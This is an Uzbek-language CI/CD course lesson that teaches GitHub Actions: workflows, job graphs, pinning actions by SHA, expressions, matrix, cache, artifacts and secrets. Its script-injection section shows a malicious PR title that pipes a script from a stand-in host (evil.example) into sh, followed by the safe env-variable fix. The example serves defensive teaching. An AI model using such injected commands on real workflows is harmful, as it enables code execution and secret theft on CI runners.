# 2-dars: GitHub Actions

Maqsad: GitHub Actions'da workflow'ni noldan yozish, xavfsiz sozlash va debug qilishni o'rganish. Siz PR'dagi yashil va qizil check'larni ko'p ko'rgansiz, bu darsda ularning egasi bo'lasiz: hodisadan (push, PR) runner'dagi buyruqgacha zanjir qanday ishlashini, har job nima uchun toza mashinada boshlanishini, `${{ }}` ifodasi qachon hisoblanishini, token va secret'lar kimga va qachon berilishini mexanizm darajasida tushunasiz. 1-darsda pipeline'ni lokal `Makefile` sifatida qurdingiz, endi o'sha target'larni GitHub runner'ida ishga tushirasiz va ustiga matrix, cache, artifact, image'ni GHCR'ga push qilish va approval qo'shasiz. Bu modulning asosiy asbobi: 3- va 4-darslarda shu pipeline GitLab CI va Jenkins'ga ko'chiriladi, 5-darsda unga deploy job'i qo'shiladi.

Taxminiy vaqt: 6 kun (siz uchun). Birinchi kun 1–3 bo'limlar, "Birga bajaramiz" va A guruh; ikkinchi kun 4–6 bo'limlar va B guruh; uchinchi kun 7–8 bo'limlar va C guruh; to'rtinchi kun 9–10 bo'limlar, 15, 16 va 18-vazifalar; beshinchi kun 11–12 bo'limlar, 17 va 19-vazifalar; oltinchi kun 20-vazifa, tozalash va README. Diqqatni quyidagilarga qarating: `GITHUB_TOKEN` permissions, action'larni SHA bo'yicha pin qilish, expression'lar orqali script injection, secret'lar qaysi trigger'da berilmasligi, cache kaliti qanday ishlashi, `needs` bilan job grafi, `gh run` bilan debug.

Qanday o'qish kerak: har bo'limdagi fragmentni o'qib, "bu qator qayerda va qachon bajariladi" degan savolga javob bering (GitHub servisida, runner'da, shell'da). Log parchalarida sizdagi qiymatlar (run ID, vaqt, SHA, versiya) farq qiladi, bunday joylar `<...>` bilan belgilangan. Action versiyalari ham `@v<N>` deb yozilgan, chunki major versiyalar tez almashadi: joriy relizni qanday topish 3-bo'limda. Har bo'lim oxiridagi "Nima uchun shunday" qoidaning sababini aytadi.

## Laboratoriya

Bu darsda uchta "joy" bor:

| Joy | Nima ishlaydi |
|-----|---------------|
| Host (Zorin yoki macOS) | `git`, `gh`, `actionlint`, lokal `make test`, `docker pull` (15-vazifa) |
| GitHub-hosted runner | workflow'ning o'zi: har job uchun GitHub yaratadigan bir martalik Ubuntu VM (`x86_64`) |
| Konteyner (host'da) | `actionlint` image'i, ixtiyoriy self-hosted runner (19-vazifa) |

- GitHub'da alohida **public** repo `cicd-demo`. Public repo'da standart hosted runner'lar bepul va environment himoya qoidalari (required reviewers) mavjud. Private repo'da daqiqa limiti va tarifga bog'liq cheklovlar bor; aniq raqamlar o'zgarib turadi, Manbalar'dagi billing sahifasidan qarang.
- Repo'ga 1-darsdagi `app/`, `Dockerfile`, `Makefile` ko'chiriladi. Workflow fayllari faqat repo ildizidagi `.github/workflows/` da ishlaydi, shuning uchun ular o'quv repozitoriysida emas, `cicd-demo` da turadi.
- Ish papkasi `cicd/02-github-actions/`: `README.md` ga javoblar, run havolalari (`gh run view <id> --web` ochgan sahifa manzili) va workflow fayllarining yakuniy nusxasi.
- Tozalash: dars oxirida sinov package versiyalarini GHCR'dan o'chiring (package sahifasi, Package settings), `DEMO_SECRET` ni o'chiring, self-hosted runner ro'yxatdan o'tkazgan bo'lsangiz uni repo sozlamalaridan olib tashlang va konteynerini o'chiring.

### Asboblar

`gh` (GitHub CLI) git modulining 4-darsida o'rnatilgan: Zorin'da rasmiy apt repo'dan, macOS'da `brew install gh`. Har mashinada bir marta `gh auth login`, tekshirish `gh auth status`. HTTPS orqali `.github/workflows/` ichidagi faylni push qilish uchun token'da `workflow` scope bo'lishi kerak, aks holda push rad etiladi (`refusing to allow an OAuth App to create or update workflow ... without workflow scope`). Yechim: `gh auth refresh -s workflow`.

`actionlint` workflow fayllarini push'dan oldin tekshiradigan linter (11-bo'lim):

```
# both hosts, container form (run in the repo root)
docker run --rm -v "$PWD":/repo --workdir /repo rhysd/actionlint:latest -color

# macOS (arm64)
brew install actionlint

# Zorin (amd64): release binary into ~/.local/bin
gh release download --repo rhysd/actionlint --pattern '*_linux_amd64.tar.gz' --dir /tmp/actionlint
tar -xzf /tmp/actionlint/actionlint_*_linux_amd64.tar.gz -C /tmp/actionlint actionlint
mkdir -p ~/.local/bin && mv /tmp/actionlint/actionlint ~/.local/bin/
actionlint -version
```

`~/.local/bin` `PATH` da bo'lishi kerak (linux moduli, 5-dars). Binary shaklida `actionlint` `run:` ichidagi shell'ni tekshirish uchun `shellcheck` ni `PATH` dan qidiradi, konteyner image'ida u ichida bor.

| Mashina | Bu darsda nima farq qiladi |
|---------|----------------------------|
| Zorin (ofis) | Host `amd64`. CI qurgan image (`linux/amd64`) `docker pull` dan keyin to'g'ridan ishlaydi. Self-hosted runner konteyneri `X64` label'i bilan ro'yxatdan o'tadi. |
| macOS (uy) | Host `arm64`. CI qurgan `linux/amd64` image Docker Desktop'da emulyatsiya ostida ishlaydi va platforma haqida ogohlantirish chiqaradi (10-bo'lim). Self-hosted runner konteyneri Docker Desktop VM'i ichida `ARM64` bo'ladi, unda qurilgan image ham `arm64`. `sed -i`, `grep -P` kabi GNU flag'lar host'da yo'q, lekin workflow ichidagi `run:` runner'da (Ubuntu) bajariladi, u yerda bor. |

Mashinalar orasida nima umumiy, nima alohida: `cicd-demo` reposi, uning secret'lari, variable'lari, environment'lari, run tarixi va GHCR package'lari GitHub'da turadi, ikkala mashinadan bir xil ko'rinadi. Run natijasi qaysi mashinadan push qilinganiga bog'liq emas. Har mashinada alohida: lokal clone (`gh repo clone <owner>/cicd-demo`), `gh auth login` va `workflow` scope, `actionlint`, self-hosted runner. Ofisda ishga tushirilgan runner uyda offline: unga mo'ljallangan job navbatda cheksiz kutadi (12-bo'lim).

Secret qiymatlari hech qachon workflow fayliga, repo'ga yoki shell tarixiga yozilmaydi: `gh secret set NAME` qiymatni so'rab oladi yoki stdin'dan o'qiydi.

---

## 1. Workflow modeli: hodisa, workflow, job, step

### Zanjir

GitHub Actions hodisaga asoslangan tizim. Repo'da biror narsa sodir bo'ladi (**event**, hodisa: push, PR ochildi, cron vaqti keldi), GitHub `.github/workflows/` dagi har YAML faylning `on:` kalitini shu hodisa bilan solishtiradi va mos kelganlar uchun **workflow run** yaratadi. Run ichida **job**'lar bor, har job ichida ketma-ket **step**'lar. 1-darsdagi pipeline anatomiyasi bilan mosligi: workflow = pipeline, job = job, step = step, "stage" tushunchasi esa yo'q (2-bo'lim).

**Runner** (1-dars) job'ni bajaradigan mashina. GitHub-hosted runner'da har job uchun yangi virtual mashina yaratiladi, unda runner dasturi job'ning step'larini navbat bilan bajaradi, job tugagach VM yo'q qilinadi. Oqibati: bir job'da o'rnatilgan paket, yaratilgan fayl, `cd` qilingan papka ikkinchi job'da yo'q. Job'lar orasida faqat uch narsa o'tadi: output (kichik satr, 2-bo'lim), artifact va cache (6-bo'lim). Step'lar esa bitta VM'da ishlaydi va fayl tizimini bo'lishadi, lekin har `run:` step alohida shell jarayoni: bir step'dagi `export FOO=1` yoki `cd` keyingisiga o'tmaydi.

### Misol: bitta workflow, qatorma-qator

Go loyihasi uchun (vazifadagi Node ilovasidan boshqa holat):

```yaml
name: checks
on:
  push:
    branches: [main]
  pull_request:
jobs:
  vet:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v<N>
      - uses: actions/setup-go@v<N>
        with:
          go-version: '1.24'
      - name: Vet
        run: go vet ./...
```

- `name` run ro'yxatida va PR check nomida ko'rinadigan nom.
- `on.push.branches: [main]` faqat `main` ga push; `pull_request` filtrsiz, ya'ni har PR ochilganda va unga yangi commit qo'shilganda.
- `jobs.vet` job identifikatori (`needs` va check nomida ishlatiladi). `runs-on` qaysi runner image'ida ishlashini aytadi.
- Step ikki xil. `uses:` tayyor **action**'ni chaqiradi (boshqa repo'dagi qayta ishlatiladigan step, 3-bo'lim), unga parametr `with:` orqali beriladi. `run:` shell buyrug'i: runner uni vaqtinchalik skript fayliga yozib, Linux'da standart holatda `bash -e` bilan bajaradi. `-e` birinchi nol bo'lmagan exit code'da (linux moduli, 1-dars) skriptni to'xtatadi, step va job "failed" bo'ladi.
- Repo kodi runner'da o'z-o'zidan paydo bo'lmaydi: VM toza, `actions/checkout` repo'ni klonlaydi. Usiz `go vet` bo'sh papkada ishlaydi.

Run sahifasidagi log'da har step alohida guruh. Birinchi guruh "Set up job": runner versiyasi, VM image'i nomi va versiyasi, `GITHUB_TOKEN` huquqlari va yuklab olingan action'lar ro'yxati shu yerda. `run:` step'i shunday ko'rinadi:

```
Run go vet ./...
  go vet ./...
  shell: /usr/bin/bash -e {0}
```

Birinchi qator step nomi (nom berilmagan bo'lsa buyruqning o'zi), keyin skript matni va qaysi shell bilan bajarilgani; `{0}` skript fayli yo'lining o'rni. Buyruq yiqilsa oxirida `Error: Process completed with exit code <N>.` chiqadi.

### Trigger'lar

| Trigger | Qachon | Eslatma |
|---------|--------|---------|
| `push` | branch yoki tag'ga push | `branches`, `tags`, `paths` filtrlari |
| `pull_request` | PR ochilganda, yangilanganda | fork'dan kelgan PR'ga secret berilmaydi, token read-only (8-bo'lim) |
| `workflow_dispatch` | qo'lda (UI, `gh workflow run`) | `inputs` qabul qiladi; fayl default branch'da bo'lishi kerak |
| `schedule` | cron (UTC) | faqat default branch'dagi fayl ishlaydi |
| `workflow_call` | boshqa workflow chaqirganda | reusable workflow (9-bo'lim) |
| `pull_request_target` | PR, lekin base branch kontekstida | secret'lar beriladi, xavfli (8-bo'lim) |

`runs-on: ubuntu-latest` vaqt o'tishi bilan yangi Ubuntu versiyasiga siljiydi. Takrorlanuvchanlik uchun aniq versiya (`ubuntu-24.04`) yozgan ma'qul. Image ichida nima o'rnatilgani (Node, Go, Docker, `gh`, `jq`) `actions/runner-images` reposidagi README'larda ro'yxatlangan.

### Real ishda qachon kerak

- "Lokalda ishlaydi, CI'da yo'q" holatining yarmi shu modeldan: runner toza, sizning mashinangizdagi global paket, `.env` yoki oldingi build qoldig'i u yerda yo'q.
- "Oldingi job'da build qildim, keyingisida fayl yo'q" xatosi: job'lar boshqa-boshqa VM.
- PR'dagi check nomi `<workflow name> / <job id yoki name>` dan yasaladi; branch protection (git moduli, 4-dars) shu nomga bog'lanadi, job nomini o'zgartirsangiz qoida "kutilayotgan check" da osilib qoladi.

### Nima uchun shunday

Har job'ga yangi VM qimmat ko'rinadi (har safar checkout, har safar dependency), lekin u takrorlanuvchanlik beradi: natija oldingi run qoldiqlariga bog'liq emas va bir job boshqasini buza olmaydi. Jenkins'ning klassik modeli teskari: doimiy agent, undagi workspace saqlanadi, tez, lekin "agent iflos" muammosi doimiy (4-dars). Workflow'ning repo ichida YAML bo'lishi 1-darsdagi pipeline as code: pipeline o'zgarishi ham PR orqali ko'riladi va kod bilan birga versiyalanadi.

## 2. Job grafi: `needs`, output, `if`, concurrency

### Graf

Job'lar standart holatda parallel boshlanadi, har biri o'z VM'ida. Tartib `needs` bilan beriladi: `needs: [a, b]` "a va b muvaffaqiyatli tugamaguncha boshlama" degani. GitHub Actions'da "stage" yo'q, graf faqat shu bog'lanishlardan quriladi (GitLab'da ikkalasi ham bor, 3-dars).

```yaml
jobs:
  vet:
    runs-on: ubuntu-24.04
    steps: [...]
  unit:
    runs-on: ubuntu-24.04
    steps: [...]
  package:
    needs: [vet, unit]
    if: github.event_name == 'push'
    runs-on: ubuntu-24.04
    steps: [...]
```

`vet` va `unit` birga boshlanadi, `package` ikkalasini kutadi va faqat push hodisasida ishlaydi. `needs` dagi job yiqilsa, bog'liq job'lar bajarilmaydi va run sahifasida "skipped" (kulrang) bo'lib ko'rinadi. `if:` sharti yolg'on bo'lgan job ham skipped.

### `if` va holat funksiyalari

Har job va step'da yashirin shart bor: `if: success()`, ya'ni "oldingilarning hammasi muvaffaqiyatli bo'lsa". Shuning uchun bitta step yiqilgach qolganlari o'tkazib yuboriladi. O'zingiz `if:` yozib, unda holat funksiyasini ishlatsangiz yashirin shart almashadi:

| Funksiya | Qachon rost |
|----------|-------------|
| `success()` | oldingi step'lar (job uchun: `needs` dagi job'lar) muvaffaqiyatli |
| `failure()` | oldingilardan biri yiqilgan |
| `cancelled()` | run bekor qilingan |
| `always()` | har doim, hatto bekor qilinganda ham |

```yaml
- name: Collect diagnostics
  if: failure()
  run: journalctl --no-pager | tail -50
```

Bu step faqat oldingi step yiqilganda ishlaydi. Tozalash yoki hisobot yuklash kabi "nima bo'lsa ham bajarilsin" step'lari uchun qaysi funksiya to'g'ri ekanini 8-vazifada o'zingiz tanlaysiz.

### Step va job output'lari

Step'lar orasida qiymat fayl orqali uzatiladi. Runner har step'ga maxsus fayllar yo'lini env'da beradi: `$GITHUB_OUTPUT` ga yozilgan `key=value` qatori step output'i bo'ladi, `$GITHUB_ENV` ga yozilgani keyingi step'larda env o'zgaruvchisi, `$GITHUB_STEP_SUMMARY` ga yozilgan Markdown run sahifasida ko'rinadi. Job'lar boshqa VM'da bo'lgani uchun step output'ini job darajasiga ko'tarish kerak:

```yaml
jobs:
  meta:
    runs-on: ubuntu-24.04
    outputs:
      version: ${{ steps.read.outputs.version }}
    steps:
      - uses: actions/checkout@v<N>
      - id: read
        run: echo "version=$(cat VERSION)" >> "$GITHUB_OUTPUT"
  announce:
    needs: meta
    runs-on: ubuntu-24.04
    steps:
      - run: echo "Releasing ${{ needs.meta.outputs.version }}" >> "$GITHUB_STEP_SUMMARY"
```

`id: read` step'ga nom beradi; `steps.read.outputs.version` shu step yozgan qiymat; job'ning `outputs:` xaritasi uni tashqariga chiqaradi; ikkinchi job uni `needs.meta.outputs.version` dan o'qiydi. `needs` da sanalmagan job'ning output'i ko'rinmaydi. Output bu kichik satr (versiya, tag, "true/false"). Fayl uzatish uchun artifact (6-bo'lim). Output qiymatida secret aniqlansa GitHub uni keyingi job'ga uzatmaydi.

### Concurrency

Bir xil `group` nomli run'lardan (yoki job'lardan) bir vaqtda faqat bittasi ishlaydi, yana bittasi kutishi mumkin. Navbatda kutayotgan bo'lsa-yu yangisi kelsa, eski kutayotgani bekor qilinadi.

```yaml
concurrency:
  group: checks-${{ github.ref }}
  cancel-in-progress: true
```

`group` ixtiyoriy satr; `github.ref` qo'shilgani uchun har branch va har PR o'z guruhida. `cancel-in-progress: true` kutayotganni emas, ishlab turganni ham bekor qiladi: PR'ga ketma-ket push qilinganda faqat oxirgisi tekshiriladi. Bekor qilingan run ro'yxatda `cancelled` holatida qoladi, log'ida `The operation was canceled.` yozuvi bo'ladi.

**Tuzoq: deploy'ni yarim yo'lda bekor qilish.** `cancel-in-progress: true` job qaysi step'da turganiga qaramaydi. Serverga fayl ko'chirayotgan yoki migratsiya qilayotgan job o'rtasida to'xtasa, server noaniq holatda qoladi. Deploy uchun sozlamani 10-vazifada o'zingiz asoslaysiz.

### Real ishda qachon kerak

- Tez tekshiruvlar (lint) va sekinlari (integration test) parallel, qimmat qadam (image build) ulardan keyin: feedback tez, runner vaqti behuda ketmaydi.
- Image tag'ini bir job hisoblab, build va deploy job'lari bir xil qiymatni output'dan o'qiydi (1-darsdagi build once, deploy many).
- Faol jamoada PR'ga daqiqasiga bir necha push bo'ladi, `concurrency` siz navbat va xarajat o'sadi.

### Nima uchun shunday

Stage'lar o'rniga graf (DAG, yo'naltirilgan siklsiz graf) aniqroq: job faqat haqiqatan bog'liq bo'lganini kutadi, "butun oldingi stage" ni emas. Narxi: bog'lanishlarni o'zingiz yozasiz va unutilgan `needs` tufayli deploy testlarni kutmay boshlanishi mumkin. Output'ning fayl orqali ishlashi tarixiy tuzatish: avval `::set-output` degan buyruq stdout'ga chop etilardi va log'ga tushgan begona matn output'ni soxtalashtira olardi, shuning uchun GitHub uni faylga almashtirdi.

## 3. Action'lar va pin qilish

### Action nima va qanday topiladi

Action bu qayta ishlatiladigan step: JavaScript dasturi, Docker konteyner yoki composite (step'lar to'plami, 9-bo'lim). `uses: owner/repo@ref` shunchaki git manzili: `owner/repo` GitHub'dagi ochiq repo, `ref` undagi tag, branch yoki commit SHA. Job boshida ("Set up job" guruhida) runner shu repo'ning o'sha ref'dagi nusxasini yuklab oladi:

```
Download action repository 'actions/checkout@v<N>' (SHA:<40-hex>)
```

Keyin repo ildizidagi `action.yml` ni o'qiydi: unda `inputs` (siz `with:` da beradigan parametrlar) va qanday ishga tushirilishi (`runs:`) yozilgan. npm bilan farqi muhim: registry yo'q, lockfile yo'q, integrity hash yo'q. `@v4` `package.json` dagi `^4.0.0` ga o'xshaydi, lekin `package-lock.json` siz: har run tag hozir qayerga ko'rsatsa o'shani oladi.

### Xavf: tag ko'chadi

Git tag'i o'zgaruvchan ko'rsatkich (git moduli, 2-dars): repo egasi `v4` ni boshqa commit'ga ko'chirishi mumkin, action mualliflari major tag'ni har relizda ataylab ko'chiradi ham. Action sizning runner'ingizda, job'ning token'i va step'ga berilgan secret'lar bilan ishlaydi, runner xotirasini ham o'qiy oladi. Action reposi buzib kirilsa va tag zararli commit'ga ko'chirilsa, keyingi run'da begona kod sizning secret'laringizni log'ga chiqaradi yoki tashqariga yuboradi. Bu nazariy emas: 2025-yil mart oyida `tj-actions/changed-files` action'ining tag'lari shu tarzda ko'chirilgan va minglab repo'larning log'iga secret'lar tushgan.

To'liq commit SHA esa o'zgarmas: u commit mazmunining hash'i.

```yaml
- uses: actions/checkout@<40-char-commit-sha> # v<N>.<x>.<y>
```

Yonidagi komment qaysi versiya ekanini odam (va Dependabot) uchun saqlaydi. Qisqa SHA (7 belgi) qabul qilinmaydi, faqat to'liq 40 belgi.

### Joriy relizni va SHA'ni topish

```
$ gh release view --repo actions/setup-go --json tagName --jq .tagName
v<N>.<x>.<y>
$ git ls-remote --tags https://github.com/actions/setup-go 'v<N>.<x>.<y>*'
<sha-1>	refs/tags/v<N>.<x>.<y>
```

Birinchi buyruq oxirgi reliz tag'ini beradi, ikkinchisi tag qaysi commit'ga ko'rsatishini. Agar natijada `refs/tags/...^{}` bilan tugaydigan ikkinchi qator bo'lsa, tag annotated (git moduli, 2-dars) va commit SHA aynan `^{}` qatoridagisi. Xuddi shu ma'lumot repo'ning Releases va Tags sahifalarida ham bor.

SHA'larni qo'lda yangilash og'ir, shuning uchun **Dependabot** (GitHub'ning dependency yangilovchi boti) ishlatiladi: `.github/dependabot.yml` da `package-ecosystem: github-actions` yoqilsa, yangi reliz chiqqanda SHA va kommentni yangilaydigan PR ochadi.

### Real ishda qachon kerak

- Amaliy siyosat: `actions/*` va `github/*` (GitHub'ning o'zi) uchun major tag qabul qilinadi, uchinchi tomon action'lari SHA bilan pin qilinadi. Qat'iy muhitlarda hammasi SHA bilan, va organization sozlamasida ruxsat etilgan action'lar ro'yxati cheklanadi.
- Yangi action qo'shishdan oldin: kim yozgan, `action.yml` nima so'raydi, token yoki secret kerakmi. Uch qatorli `run:` bilan almashtirish mumkin bo'lsa, action kerak emas.
- Bu darsdagi misollarda `@v<N>` yozilgan; vazifalarda avval joriy major tag, 12-vazifada SHA'ga o'tasiz.

### Nima uchun shunday

Action'lar markaziy registry'siz, to'g'ridan git repo'dan olinadi: nashr qilish oson (repo'ga tag qo'yish yetadi), lekin npm'dagi lockfile va integrity tekshiruvi kabi himoya yo'q, uni foydalanuvchi SHA bilan o'zi quradi. Major tag'ning ko'chishi qulaylik uchun o'ylangan (xavfsizlik tuzatishlari o'zi keladi), lekin aynan shu mexanizm hujum yo'li. Muqobil: action'ni o'z organization'ingizga fork qilib o'sha yerdan ishlatish yoki mantiqni `Makefile` ga yozib action'lar sonini kamaytirish (1-dars).

## 4. Context va expression'lar, script injection

### Nima va qachon hisoblanadi

**Context** bu run haqidagi ma'lumot obyekti, **expression** esa `${{ ... }}` ichidagi ifoda. Eng muhim narsa vaqt: expression shell ishga tushishidan **oldin** hisoblanadi va natijasi YAML'dagi joyiga oddiy matn sifatida qo'yiladi. Job darajasidagi kalitlar (`runs-on`, job `if`, `strategy`, `concurrency`) GitHub servisida, job runner'ga yuborilishidan oldin; step darajasidagilar runner dasturida, step boshlanishidan oldin. Shell hech qachon `${{ }}` ni ko'rmaydi, u tayyor matnni oladi. JS'dagi template literal emas, ko'proq build vaqtidagi satr almashtirishga (`DefinePlugin`) o'xshaydi.

| Context | Ichida nima | Misol |
|---------|-------------|-------|
| `github` | hodisa, repo, ref, SHA | `github.sha`, `github.ref_name`, `github.event_name`, `github.actor` |
| `env` | workflow/job/step `env` qiymatlari | `env.GO_VERSION` |
| `vars` | konfiguratsiya variable'lari (ochiq) | `vars.APP_URL` |
| `secrets` | secret'lar | `secrets.DEPLOY_KEY` |
| `matrix` | joriy matrix kombinatsiyasi | `matrix.os` |
| `needs` | oldingi job'lar natijasi va output'lari | `needs.meta.outputs.version` |
| `steps` | shu job'dagi oldingi step'lar | `steps.read.outputs.version` |
| `runner` | runner haqida | `runner.os`, `runner.temp` |
| `inputs` | `workflow_dispatch`/`workflow_call` kirishlari | `inputs.environment` |

`github.event` hodisaning to'liq webhook payload'i (PR sarlavhasi, muallif, label'lar). `github.ref` va `github.sha` hodisa turiga qarab boshqa narsani bildiradi: push va PR run'larida farqini 5-vazifada o'zingiz topasiz. Funksiyalar: `contains()`, `startsWith()`, `endsWith()`, `format()`, `hashFiles()`, `toJSON()`, `fromJSON()`. Operatorlar: `==`, `!=`, `&&`, `||`, `!`; satrlar bitta tirnoqda (`'main'`). Mavjud bo'lmagan maydon xato emas, bo'sh satr beradi, shuning uchun xato yozilgan nom jimgina "ishlaydi".

### Script injection

Matn almashtirish bo'lgani uchun, foydalanuvchi boshqaradigan qiymat `run:` ichiga qo'yilsa kodga aylanadi:

```yaml
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

PR sarlavhasi `x"; curl https://evil.example/s.sh | sh; echo "` bo'lsa, runner yozadigan skript fayli shunday chiqadi:

```
echo "Title: x"; curl https://evil.example/s.sh | sh; echo ""
```

Shell uchun bu uchta qonuniy buyruq. SQL injection bilan bir xil xato: ma'lumot kod bilan bitta satrga yopishtirilgan. Davo ham bir xil, ma'lumotni alohida kanal orqali berish:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```

Endi expression natijasi skript matniga emas, jarayonning env o'zgaruvchisiga tushadi. Shell `"$TITLE"` ni qiymat sifatida ochadi va ichidagi `;` yoki `$( )` ni qayta talqin qilmaydi (linux moduli, 5-dars: qo'shtirnoq ichidagi o'zgaruvchi). Xavfli manbalar: PR sarlavhasi va matni, branch nomi (`github.head_ref`), commit xabari, issue matni, komment, `inputs`.

### Real ishda qachon kerak

- Har `run:` ni ko'rib chiqishda savol: ichidagi `${{ }}` qiymatini tashqi odam boshqara oladimi? `actionlint` ma'lum xavfli context'larni o'zi ushlaydi.
- `if:` ichida `${{ }}` yozish shart emas (`if: github.ref == 'refs/heads/main'`), chunki `if` qiymati doim expression.
- Debug'da context'ni ko'rish: `env: STEPS: ${{ toJSON(steps) }}` va `run: echo "$STEPS"`. `secrets` ni hech qachon bunday chop etmang.

### Nima uchun shunday

Expression'lar shell'dan mustaqil bo'lishi kerak edi: ular `with:`, `if:`, `runs-on:` kabi shell umuman yo'q joylarda ham ishlaydi va Windows runner'da PowerShell bilan ham bir xil. Buning narxi: tizim shell tirnoqlarini bilmaydi va escape qilmaydi. Muqobil yondashuv GitLab CI'da: u yerda qiymatlar asosan env o'zgaruvchilari sifatida beriladi (3-dars), bu xato qilishni qiyinlashtiradi.

## 5. Matrix

### Nima va qanday kengayadi

Matrix bitta job ta'rifidan bir nechta job hosil qiladi. GitHub servisi run boshida `matrix` dagi ro'yxatlarning dekart ko'paytmasini hisoblaydi va har kombinatsiya uchun alohida job (alohida VM) yaratadi, ichida `matrix.<kalit>` o'sha kombinatsiya qiymati bo'ladi.

```yaml
test:
  strategy:
    fail-fast: false
    matrix:
      python: ['3.12', '3.13']
      os: [ubuntu-24.04, macos-latest]
  runs-on: ${{ matrix.os }}
  steps:
    - uses: actions/checkout@v<N>
    - uses: actions/setup-python@v<N>
      with:
        python-version: ${{ matrix.python }}
    - run: python -m unittest
```

2 × 2 = 4 job. Run sahifasida va `gh run view` da ular `test (3.12, ubuntu-24.04)`, `test (3.13, macos-latest)` kabi nomlanadi, ya'ni PR'da to'rtta alohida check. Versiyalar qo'shtirnoqda, chunki YAML `3.10` ni son deb o'qib `3.1` ga aylantiradi.

- `fail-fast` standart `true`: bitta kombinatsiya yiqilsa, ishlab turgan va navbatdagi qolganlari bekor qilinadi. `false` da hammasi oxirigacha ishlaydi.
- `include` qo'shimcha kombinatsiya yoki mavjudiga qo'shimcha maydon qo'shadi, `exclude` olib tashlaydi, `max-parallel` bir vaqtda ishlaydigan job'lar sonini cheklaydi.
- Job'lar soni ko'paytma: 3 × 3 × 2 = 18, har biri runner vaqti (macOS va Windows runner'lari Linux'dan qimmatroq hisoblanadi).

### Real ishda qachon kerak

- Kutubxona bir necha runtime versiyasini qo'llasa (`package.json` dagi `engines` va'dasini tekshirish), yoki dastur bir necha OS va arxitekturada chiqarilsa.
- Ilova (kutubxona emas) odatda bitta, production'dagi versiyada test qilinadi; matrix yangi versiyaga ko'chish davrida vaqtincha qo'shiladi.
- Branch protection'da matrix job'ining har kombinatsiyasi alohida check nomi: versiya ro'yxati o'zgarsa qoidani ham yangilash kerak.

### Nima uchun shunday

Muqobili job'ni nusxalash: to'rtta deyarli bir xil YAML blok, biri yangilanib boshqasi unutiladi. Matrix "nima o'zgaradi" ni ma'lumotga, "nima qilinadi" ni bitta ta'rifga ajratadi. `fail-fast: true` standart, chunki ko'p holatda bitta xato hamma kombinatsiyada takrorlanadi va qolganini kutish vaqt isrofi.

## 6. Cache va artifact

Ikkalasi ham "fayllarni VM'dan tashqarida saqlash", lekin maqsad boshqa: **cache** tezlashtirish uchun (yo'qolsa hech narsa buzilmaydi, faqat sekinlashadi), **artifact** natija uchun (1-dars: build mahsuli, hisobot).

### Cache mexanizmi

`actions/cache` ikki bosqichda ishlaydi. O'z step'ida `key` bo'yicha saqlangan arxivni qidiradi va topsa `path` ga ochadi. Job muvaffaqiyatli tugaganda avtomatik "Post" step'ida `path` ni arxivlab shu `key` bilan yuklaydi, lekin faqat boshida aniq mos kelmagan bo'lsa: cache yozuvi o'zgarmas, mavjud kalit ustidan yozilmaydi.

```yaml
- uses: actions/cache@v<N>
  with:
    path: ~/go/pkg/mod
    key: gomod-${{ runner.os }}-${{ hashFiles('**/go.sum') }}
    restore-keys: |
      gomod-${{ runner.os }}-
```

`hashFiles('**/go.sum')` lock faylining hash'i: dependency'lar o'zgarsa kalit o'zgaradi va eski cache ishlatilmaydi. `restore-keys` aniq kalit topilmaganda prefiks bo'yicha eng yangi yozuvni beradi: ko'p modul allaqachon bor, faqat yangisi yuklanadi, job oxirida esa yangi kalit bilan to'liq cache saqlanadi. Log'da uch holat:

```
Cache not found for input keys: gomod-Linux-<hash>, gomod-Linux-
Cache restored from key: gomod-Linux-<hash>
Cache hit occurred on the primary key gomod-Linux-<hash>, not saving cache.
```

Birinchisi miss, ikkinchisi tiklangan (kalit siznikidan farq qilsa, `restore-keys` orqali qisman), uchinchisi Post step'ida: aniq hit bo'lgani uchun qayta saqlanmadi. Miss'dan keyin Post step'ida `Cache saved with key: ...` chiqadi.

Node uchun xuddi shu g'oya: kalitda `package-lock.json` hash'i, `path` esa `node_modules` emas, npm'ning yuklab olingan paketlar keshi (`npm config get cache` ko'rsatadigan papka), chunki `npm ci` har safar `node_modules` ni o'chirib qayta quradi. `actions/setup-node` ning `cache: npm` parametri shuni o'zi qiladi. Cache branch bo'yicha ajratilgan: job o'z branch'i va default branch cache'ini o'qiy oladi, boshqa feature branch'nikini yo'q. Repo uchun umumiy hajm cheklangan, eski yozuvlar o'chiriladi (`gh cache list`, `gh cache delete`).

### Artifact

`actions/upload-artifact` fayllarni run'ga biriktiradi (`name`, `path`, `retention-days`), `actions/download-artifact` boshqa job'da oladi, `gh run download <id>` lokal mashinaga. Saqlash muddati standart holatda uzoq (hujjatda 90 kun, repo sozlamasida o'zgartiriladi). Test hisoboti, coverage, build natijasi shu yerda.

**Tuzoq: artifact ichidagi secret.** Public repo'da artifact'ni GitHub'ga kirgan har qanday odam yuklab oladi. `.env`, kubeconfig yoki butun ishchi papkani (`path: .`, ichida `.git/config` dagi token bilan) yuklash secret'ni ochadi.

### Real ishda qachon kerak

- Cache: dependency'lar, kompilyator keshi, Docker layer'lar (10-bo'lim). Artifact: yiqilgan testning hisoboti va skrinshotlari, release binary'si, bir job qurib boshqasi ishlatadigan `dist/`.
- "Cache'ga build natijasini qo'yib keyingi job'da olaman" xato: cache topilmasligi mumkin va bu xato sanalmaydi.

### Nima uchun shunday

Cache yozuvining o'zgarmasligi poygadan himoya: parallel job'lar bir kalitni buzib qo'ya olmaydi, narxi esa kalitni mazmun hash'iga bog'lash majburiyati. Branch bo'yicha ajratish xavfsizlik uchun: PR'dagi (ehtimol begona) kod `main` ishlatadigan cache'ni zaharlay olmasligi kerak.

## 7. Secret, variable va environment

### Secret va variable

| | Secrets | Variables |
|-|---------|-----------|
| Qiymat | shifrlangan, yozilgach o'qib bo'lmaydi | ochiq matn |
| Log'da | maskalanadi | ko'rinadi |
| Context | `secrets.NAME` | `vars.NAME` |
| CLI | `gh secret set NAME` | `gh variable set NAME` |

Darajalar: organization, repository, environment. Mexanizm: `gh secret set` qiymatni repo'ning public key'i bilan sizning mashinangizda shifrlab yuboradi, GitHub uni faqat job'ga uzatish paytida ochadi, qayta o'qish API'si yo'q. Secret'lar job'ga avtomatik env sifatida tushmaydi, har step'ga aniq uzatiladi (`env:` yoki `with:`): step'ga berilmagan secret'ni o'sha step ko'rmaydi.

